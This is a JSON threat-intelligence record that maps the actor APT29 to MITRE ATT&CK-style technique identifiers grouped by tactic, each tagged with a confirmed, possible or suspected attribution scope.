{
  "id": "threat-actor--7a39953e-0dae-569a-9d49-d52a4a8865b1",
  "name": "APT29",
  "type": "actor-mitre",
  "attack-patterns": {
    "Impact": [
      {
        "id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b",
        "attribution_scope": "confirmed"
      }
    ],
    "Lateral Movement": [
      {
        "id": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Resource Development": [
      {
        "id": "attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--1cec9319-743b-4840-bb65-431547bce82a",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Credential Access": [
      {
        "id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8",
            "attribution_scope": "suspected"
          }
        ]
      },
      {
        "id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
        "attribution_scope": "confirmed"
      }
    ],
    "Discovery": [
      {
        "id": "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
        "attribution_scope": "confirmed"
      }
    ],
    "Initial Access": [
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Persistence": [
      {
        "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf",
            "attribution_scope": "suspected"
          }
        ]
      },
      {
        "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
            "attribution_scope": "suspected"
          },
          {
            "id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
        "attribution_scope": "confirmed"
      }
    ],
    "Exfiltration": [
      {
        "id": "attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Execution": [
      {
        "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Privilege Escalation": [
      {
        "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf",
            "attribution_scope": "suspected"
          }
        ]
      },
      {
        "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
            "attribution_scope": "suspected"
          },
          {
            "id": "attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Defense Evasion": [
      {
        "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Reconnaissance": [
      {
        "id": "attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120",
            "attribution_scope": "possible"
          }
        ]
      }
    ],
    "Collection": [
      {
        "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f",
        "attribution_scope": "suspected"
      },
      {
        "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c",
        "attribution_scope": "confirmed"
      }
    ],
    "Command and Control": [
      {
        "id": "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b",
            "attribution_scope": "suspected"
          },
          {
            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
        "attribution_scope": "confirmed"
      }
    ]
  },
  "is_publishable": true
}
